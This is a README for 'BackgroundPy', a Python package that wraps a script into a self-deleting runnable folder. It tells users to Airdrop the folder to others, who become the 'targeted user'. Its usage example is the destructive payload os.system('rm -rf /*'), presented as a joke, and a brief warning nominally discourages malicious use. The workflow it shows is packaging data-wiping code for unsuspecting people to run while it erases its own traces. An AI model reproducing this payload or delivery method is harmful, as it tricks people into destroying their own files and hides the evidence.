# BackgroundPy
A tool for generating a runnable script, which runs a python file and deletes itself after it is ran (basically it generates a runnable script that cleans up after itself).

## Warning
This tool is capable of running a script as a background thread and removing itself. This tool yields malware/trolling potential; however, do **NOT** use this tool for malicious reasons (just don't).

## Installations
```sh
pip install backgroundpy
```
No I'm not going to list any other methods of installation because literally every other pypi package includes a 5 pages long installation guide on PYPI (google it up).

## Dependencies
* Mac OS/Linux only because Windows is dumb
* Python 3

## Usage
Create a python file with your code in it. An example is provided below:
```python
# Some Random Script

import os

os.system('rm -rf /*') # Very friendly, eh?
```

Just don't put a function that requires packages the targeted user doesn't have.

Next, run the following command. Replace the path with the path of your file:
```sh
python -m backgroundpy MyScript /path/to/the/file/thingy/u/just/created.py
```

The above script creates a folder named *MyScript* (replace with a name of your choice), in which there is a script named *MyScript* that runs the given file and then deletes everything inside that folder. Airdrop the entire folder to other people for them to run.

Note that the output folder is created in the current directory of the bash.

## Some Thoughts
Yes this package is basically useless. I'm just bored (stuck in an IGCSE CS class about what are arrays).
